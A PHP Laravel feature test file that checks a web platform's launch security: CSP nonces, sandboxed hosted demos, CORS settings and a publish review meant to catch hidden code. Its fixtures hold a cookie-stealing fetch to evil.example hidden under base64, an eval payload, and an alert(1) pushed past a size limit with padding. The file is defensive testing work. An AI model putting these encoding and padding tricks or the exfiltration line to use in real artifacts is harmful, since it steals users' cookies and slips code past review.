<?php

namespace Tests\Feature;

use App\Http\Controllers\VibyraAppController;
use App\Http\Middleware\VibyraCors;
use App\Services\Community\PublishedArtifactReview;
use App\Services\Community\ProjectSafetyReview;
use Illuminate\Http\Request;
use Tests\TestCase;

class WebsiteLaunchSecurityTest extends TestCase
{
    use \Illuminate\Foundation\Testing\RefreshDatabase;
    public function test_regular_and_challenge_html_receive_trusted_nonces_and_no_store(): void
    {
        config(['services.turnstile.enabled' => true, 'services.turnstile.site_key' => 'site', 'services.turnstile.secret_key' => 'secret']);
        foreach (['/legal/privacy' => 200, '/downloads' => 403] as $path => $status) {
            $response = $this->get($path)->assertStatus($status)->assertHeader('X-Content-Type-Options', 'nosniff');
            $csp = $response->headers->get('Content-Security-Policy');
            $this->assertStringContainsString("script-src-attr 'none'", $csp);
            preg_match("/'nonce-([^']+)'/", $csp, $matches);
            $this->assertNotEmpty($matches[1] ?? null);
            if ($path === '/downloads') $response->assertSee('nonce="'.$matches[1].'"', false);
            $this->assertStringContainsString('no-store', $response->headers->get('Cache-Control'));
        }
    }

    public function test_every_hosted_mime_is_sandboxed_and_unknown_types_download(): void
    {
        $controller = app(VibyraAppController::class);
        $method = new \ReflectionMethod($controller, 'hostedDemoHeaders');
        foreach (['text/html', 'image/svg+xml', 'application/xhtml+xml', 'text/xml'] as $type) {
            $headers = $method->invoke($controller, $type);
            $this->assertStringStartsWith('sandbox', $headers['Content-Security-Policy']);
            $this->assertStringNotContainsString('allow-same-origin', $headers['Content-Security-Policy']);
            $this->assertSame('nosniff', $headers['X-Content-Type-Options']);
            if (in_array($type, ['application/xhtml+xml', 'text/xml'])) {
                $this->assertSame('application/octet-stream', $headers['Content-Type']);
                $this->assertSame('attachment', $headers['Content-Disposition']);
            }
            $response = VibyraCors::withCorsHeaders(response('test')->withHeaders($headers), Request::create('/api/community/projects/demo/demo/index.html'));
            $this->assertSame('*', $response->headers->get('Access-Control-Allow-Origin'));
            $this->assertFalse($response->headers->has('Access-Control-Allow-Credentials'));
        }
    }

    public function test_decoded_hosted_artifact_is_reviewed_before_client_snapshot(): void
    {
        $actual = 'document.cookie; fetch("https://evil.example/collect")';
        $review = PublishedArtifactReview::collect(['files' => [['path' => 'app.js', 'encoding' => 'base64', 'body' => base64_encode($actual)]]], null,
            [['path' => 'app.js', 'body' => 'console.log("safe")']]);
        $this->assertSame($actual, $review['files'][0]['body']);
        config(['moderation.publish_force_approve_under_review' => false, 'moderation.publish_review_temporarily_disabled' => false, 'moderation.remote_enabled' => false, 'moderation.publish_ai_review.enabled' => false]);
        $decision = app(ProjectSafetyReview::class)->review(['title' => 'Demo', 'sourceFiles' => $review['files']]);
        $this->assertFalse($decision['public']);
        $this->assertContains('browser_storage_exfiltration', array_column($decision['findings'], 'code'));
    }

    public function test_server_marks_oversized_artifacts_incomplete(): void
    {
        $review = PublishedArtifactReview::collect(['files' => [['path' => 'app.js', 'body' => str_repeat(' ', 24001).'alert(1)']]], null, []);
        $this->assertTrue($review['incomplete']);
        config(['moderation.publish_force_approve_under_review' => true, 'moderation.publish_review_temporarily_disabled' => true, 'moderation.remote_enabled' => false, 'moderation.publish_ai_review.enabled' => false]);
        $this->app->instance('env', 'production');
        $decision = app(ProjectSafetyReview::class)->review(['title' => 'Demo', 'sourceFiles' => $review['files']]);
        $this->assertFalse($decision['public']);
        $this->assertContains('source_snapshot_truncated', array_column($decision['findings'], 'code'));
        $this->assertNotContains('temp_publish_review_disabled', array_column($decision['findings'], 'code'));
    }
    public function test_publish_cannot_hide_encoded_hosted_code_behind_a_clean_snapshot(): void
    {
        config(['services.openai.key' => 'fixture', 'moderation.remote_enabled' => true,
            'moderation.publish_force_approve_under_review' => false, 'moderation.publish_review_temporarily_disabled' => false,
            'moderation.publish_ai_review.enabled' => false]);
        \Illuminate\Support\Facades\Http::fake(['https://api.openai.com/v1/moderations' =>
            \Illuminate\Support\Facades\Http::response(['results' => [['flagged' => false, 'categories' => [], 'category_scores' => []]]])]);
        $token = $this->postJson('/api/auth/signup', ['name' => 'Review Fixture', 'email' => 'artifact-review@example.test', 'password' => 'fixture-secret-123'])->assertCreated()->json('token');
        $this->postJson('/api/projects/publish', [
            'projectId' => 'encoded-artifact', 'title' => 'Demo', 'description' => 'Artifact review',
            'sourceFiles' => [['path' => 'app.js', 'body' => 'console.log("safe")']],
            'hostedDemo' => ['ok' => true, 'entryPath' => 'index.html', 'files' => [
                ['path' => 'index.html', 'contentType' => 'text/html', 'body' => '<h1>Demo</h1><script src="app.js"></script>'],
                ['path' => 'app.js', 'contentType' => 'application/javascript', 'encoding' => 'base64', 'body' => base64_encode('eval("hidden compiled behavior")')],
            ]],
        ], ['Authorization' => "Bearer {$token}"])->assertStatus(202)->assertJsonPath('isPublic', false)
            ->assertJsonFragment(['code' => 'dynamic_code_execution']);
    }

}
